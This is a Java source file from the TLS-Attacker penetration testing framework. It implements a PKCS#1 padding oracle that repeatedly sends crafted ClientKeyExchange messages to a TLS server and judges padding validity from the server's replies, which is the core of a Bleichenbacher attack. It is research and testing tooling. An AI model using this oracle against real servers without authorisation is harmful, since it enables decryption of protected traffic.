/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.pkcs1.oracles;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsattacker.util.MathHelper;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;

/**
 *
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class RealDirectMessagePkcs1Oracle extends Pkcs1Oracle {

    Config config;

    private final String validResponseContent;

    private final String invalidResponseContent;

    public RealDirectMessagePkcs1Oracle(PublicKey pubKey, Config config, String validResponseContent,
            String invalidResponseContent) {
        this.publicKey = (RSAPublicKey) pubKey;
        this.blockSize = MathHelper.intceildiv(publicKey.getModulus().bitLength(), 8);
        this.config = config;
        this.validResponseContent = validResponseContent;
        this.invalidResponseContent = invalidResponseContent;
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) {
        // we are initializing a new connection in every loop step, since most
        // of the known servers close the connection after an invalid handshake
        State state = new State(config);
        state.getConfig().setWorkflowTraceType(WorkflowTraceType.FULL);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(state.getConfig()
                .getWorkflowExecutorType(), state);
        WorkflowTrace trace = state.getWorkflowTrace();

        RSAClientKeyExchangeMessage cke = (RSAClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
        ModifiableByteArray epms = new ModifiableByteArray();
        epms.setModification(ByteArrayModificationFactory.explicitValue(msg));
        cke.setPublicKey(epms);

        numberOfQueries++;
        if (numberOfQueries % 1000 == 0) {
            LOGGER.info("Number of queries so far: {}", numberOfQueries);
        }

        boolean conform = false;
        try {
            workflowExecutor.executeWorkflow();
            ProtocolMessage lastMessage = WorkflowTraceUtil.getLastReceivedMessage(trace);
            if (lastMessage != null) {
                String lastMessageLower = lastMessage.toString().toLowerCase();
                if (validResponseContent != null) {
                    conform = lastMessageLower.contains(validResponseContent.toLowerCase());
                } else if (invalidResponseContent != null) {
                    conform = !lastMessageLower.contains(invalidResponseContent.toLowerCase());
                }
            }
        } catch (WorkflowExecutionException e) {
            // TODO implementing the orcale through caught exceptions is not
            // smart
            conform = false;
            LOGGER.info(e.getLocalizedMessage(), e);
        }

        return conform;
    }
}
